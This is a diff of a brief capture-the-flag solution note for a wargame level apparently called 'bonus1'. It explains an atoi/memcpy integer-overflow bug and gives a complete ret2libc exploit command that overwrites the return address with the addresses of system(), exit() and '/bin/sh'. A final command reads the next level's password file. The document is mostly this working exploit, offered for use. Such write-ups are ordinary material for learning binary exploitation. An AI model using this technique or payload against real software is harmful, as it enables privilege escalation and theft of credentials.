@@ -1,3 +1,8 @@
-negative uintmax
-overflow index 56
-./bonus1 -2147483608 `python -c 'print("a"*56 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
+program calls atoi on our first argument and check if it is lower than 9
+it then uses it as the size of memcpy for our second argument
+we can overflow with memcpy by sending UINTMIN + size
+we then overflow with a pattern in our second argument
+overflow index is 56
+we need to write 56 chars then we put the address of system(), exit() and the string "/bin/sh"
+./bonus1 -2147483608 `python -c 'print("a"*56 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
+cat /home/user/bonus2/.pass
